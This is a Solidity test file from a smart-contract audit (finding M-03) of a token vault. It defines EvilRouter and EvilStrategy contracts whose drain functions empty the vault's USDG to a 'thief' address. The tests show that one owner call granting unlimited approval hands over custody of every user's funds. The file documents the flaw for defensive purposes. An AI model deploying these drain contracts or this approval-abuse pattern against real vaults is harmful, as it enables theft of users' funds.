// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import {BaseTest} from "../../BaseTest.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {IPlanVault} from "../../../src/interfaces/IPlanVault.sol";

/// @dev A "router" that never swaps: it only needs the standing approval the vault grants in _setRouter.
contract EvilRouter {
    address public immutable weth;

    constructor(address weth_) {
        weth = weth_;
    }

    function drain(IERC20 token, address from, address to) external {
        token.transferFrom(from, to, token.balanceOf(from));
    }
}

/// @dev A "strategy" whose only ERC-4626 surface is asset(): enough to pass setBoostStrategy and receive a
///      standing max approval on the vault's USDG.
contract EvilStrategy {
    address public immutable asset;

    constructor(address asset_) {
        asset = asset_;
    }

    function drain(address from, address to) external {
        IERC20(asset).transferFrom(from, to, IERC20(asset).balanceOf(from));
    }
}

/// @dev AUDIT v0.3 / M-03. The vault grants type(uint256).max USDG + WETH approvals to whatever address the owner
///      sets as router, and max USDG to whatever it sets as boost strategy. A single owner transaction therefore
///      hands full custody of every user's idle USDG to an arbitrary contract, with no swap, no time delay and no
///      on-chain bound. FeeReceiver, by contrast, approves exactly amountIn per call and resets it to 0.
contract Audit3_M03_AdminApprovalDrain is BaseTest {
    address internal thief = makeAddr("thief");

    function test_setRouter_isASingleTxCustodyTransfer() public {
        uint256 a = _createUsdgPlan(daily, alice, address(nvda), 100e6, 100_000e6);
        uint256 b = _createUsdgPlan(daily, bob, address(nvda), 100e6, 100_000e6);
        assertEq(usdg.balanceOf(address(daily)), 200_000e6);

        EvilRouter evil = new EvilRouter(address(weth));
        vm.prank(owner);
        daily.setRouter(address(evil)); // no interface check, no timelock, no event a user could react to in time
        assertEq(usdg.allowance(address(daily), address(evil)), type(uint256).max);

        evil.drain(usdg, address(daily), thief); // anyone
        assertEq(usdg.balanceOf(thief), 200_000e6);
        assertEq(usdg.balanceOf(address(daily)), 0);

        vm.prank(alice);
        vm.expectRevert();
        daily.withdrawIdle(a, type(uint256).max);
        vm.prank(bob);
        vm.expectRevert();
        daily.withdrawIdle(b, type(uint256).max);
    }

    function test_setBoostStrategy_isASingleTxCustodyTransfer() public {
        _createUsdgPlan(daily, alice, address(nvda), 100e6, 100_000e6);
        EvilStrategy evil = new EvilStrategy(address(usdg));
        vm.prank(owner);
        daily.setBoostStrategy(address(evil)); // passes: asset() matches, no open positions
        assertEq(usdg.allowance(address(daily), address(evil)), type(uint256).max);
        evil.drain(address(daily), thief);
        assertEq(usdg.balanceOf(thief), 100_000e6);
    }
}
